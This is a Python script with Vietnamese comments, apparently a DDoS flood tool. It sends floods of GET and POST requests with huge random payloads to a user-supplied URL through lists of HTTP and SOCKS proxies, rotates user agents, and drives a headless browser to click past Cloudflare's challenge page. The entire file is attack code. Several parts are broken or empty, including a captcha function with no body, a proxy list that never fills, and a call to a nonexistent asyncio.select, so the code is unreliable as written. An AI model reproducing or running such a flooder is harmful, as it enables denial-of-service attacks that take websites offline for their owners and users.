import requests
import aiohttp
import asyncio
import random
import string
import ssl
import sys
import os

from pyppeteer import launch

# Tạo phiên bản chuyển đổi của chương trình Cloudflare trong package
async def cloudflare_check(page):
    button = await page.querySelector('.big-button.pow-button')
    if button:
        box = await button.boundingBox()
        return {'x': box['x'] + box['width'] / 2, 'y': box['y'] + box['height'] / 2}
    else:
        return False

# Tạo phiên bản chuyển đổi của chương trình ddgCaptcha trong package
async def ddg_captcha(page):
    # Mã của chương trình ddgCaptcha


url = input("url: ")
captcha = 'true'
precheck = 'true'

# Định nghĩa headers để gửi requests
headers = {
    "Accept-Language": "en-US,en;q=0.9",
    "Referer": "https://www.google.com/",
}

# Định nghĩa danh sách proxy (địa chỉ IP và cổng)
http_proxy_file = 'http.txt'
socks4_proxy_file = 'socks4.txt'
socks5_proxy_file = 'socks5.txt'

proxies = []

# Đọc danh sách User-Agent từ tệp tin ua.txt
ua_file = 'ua.txt'
user_agents = []
if os.path.isfile(ua_file):
    with open(ua_file, 'r') as file:
        lines = file.readlines()
        for line in lines:
            user_agent = line.strip()
            if user_agent:
                user_agents.append(user_agent)

def generate_random_payload():
    length = random.randint(1, 9999999)
    text_characters = string.ascii_letters + string.digits + string.punctuation
    payload = "".join(random.choice(text_characters) for i in range(length))
    return payload

# Tạo phiên bản chuyển đổi của chương trình attack để sử dụng proxy và headers
async def attack(target, proxy):
    print("Waiting for web check...")
    session = aiohttp.ClientSession()
    context = ssl.create_default_context()

    while True:
        try:
            x = requests.get(target, headers=headers, params={"payload": generate_random_payload()}, timeout=3, proxies=proxy)
        except requests.exceptions.RequestException as e:
            print("Error:", e)

        if x is not None and x.status_code == 200:
            browser = await launch()
            page = await browser.newPage()

            # Kiểm tra Cloudflare
            cloudflare = await page.evaluate(cloudflare_check)
            if cloudflare:
                await page.hover('.big-button.pow-button')
                await page.mouse.click(cloudflare['x'], cloudflare['y'])
                await asyncio.sleep(6)  # Chờ trong 6 giây

                # Kiểm tra captcha (nếu được bật)
                if captcha == 'true':
                    await ddg_captcha(page)

                # Gửi request GET TLS với ngẫu nhiên các khóa mã hóa dữ liệu
                async with session.get(target, headers=headers, ssl=context, proxy=proxy) as response:
                    await response.text()

                # Gửi request POST với payload đã mã hóa
                payload = generate_random_payload()
                encrypted_payload = encrypt_payload(payload)  # Hàm mã hóa payload
                await session.post(
                    target,
                    data=encrypted_payload,
                    headers=headers,
                    proxy=proxy,
                    ssl=context
                )
                print("Sent POST request with encrypted payload:", encrypted_payload)

                test = requests.get(target, proxies=proxy)
                print("Testing request:", test.status_code)
                await asyncio.sleep(0.1)

            elif x is not None and x.status_code == 403:
                print("Block IP!!!")
                break

            elif x is not None and x.status_code >= 500:
                print("False back !!!, secondary attack")
                session = aiohttp.ClientSession()
                async with session.get(target, proxy=proxy) as response:
                    await response.text()
                    await response.release()

            await page.close()
            await browser.close()

        if sys.stdin in asyncio.select([sys.stdin], [], [], 0)[0]:
            break

    await session.close()

# Tạo danh sách các tác vụ attack và chạy chúng cùng nhau
async def run_attacks(url):
    tasks = []
    for proxy in proxies:
        tasks.append(attack(url, proxy))
    await asyncio.gather(*tasks)

# Hàm mã hóa payload
def encrypt_payload(payload):
    # Code để mã hóa payload
    encrypted_payload = payload  # Thay thế bằng mã hóa thực tế của bạn
    return encrypted_payload

# Chọn một User-Agent ngẫu nhiên từ danh sách User-Agent
def get_random_user_agent():
    if user_agents:
        return {
            'User-Agent': random.choice(user_agents)
        }
    else:
        return {}

# Sử dụng một User-Agent ngẫu nhiên cho mỗi yêu cầu
def send_request(url, proxy=None):
    headers.update(get_random_user_agent())
    session = requests.Session()

    try:
        if proxy:
            response = session.get(url, headers=headers, proxies=proxy, timeout=3)
        else:
            response = session.get(url, headers=headers, timeout=3)

        if response.status_code == 200:
            print(f"Success request to {url}")
    except requests.exceptions.RequestException as e:
        print(f"Error request to {url}: {e}")

# Gửi các yêu cầu bằng cách sử dụng proxy HTTP hoặc SOCKS
def send_requests(url, proxy=None):
    loop = asyncio.get_event_loop()
    loop.run_until_complete(run_attacks(url))
    send_request(url, proxy)

# Đọc từ tệp tin proxy HTTP nếu tồn tại
if os.path.isfile(http_proxy_file):
    with open(http_proxy_file, 'r') as file:
        lines = file.readlines()
        for line in lines:
            proxy = line.strip()
            if proxy:
                send_requests(url, {'http': proxy, 'https': proxy})

# Đọc từ tệp tin proxy SOCKS4 nếu tồn tại
if os.path.isfile(socks4_proxy_file):
    with open(socks4_proxy_file, 'r') as file:
        lines = file.readlines()
        for line in lines:
            proxy = line.strip()
            if proxy:
                send_requests(url, {'http': f'socks4://{proxy}', 'https': f'socks4://{proxy}'})

# Đọc từ tệp tin proxy SOCKS5 nếu tồn tại
if os.path.isfile(socks5_proxy_file):
    with open(socks5_proxy_file, 'r') as file:
        lines = file.readlines()
        for line in lines:
            proxy = line.strip()
            if proxy:
                send_requests(url, {'http': f'socks5://{proxy}', 'https': f'socks5://{proxy}'})
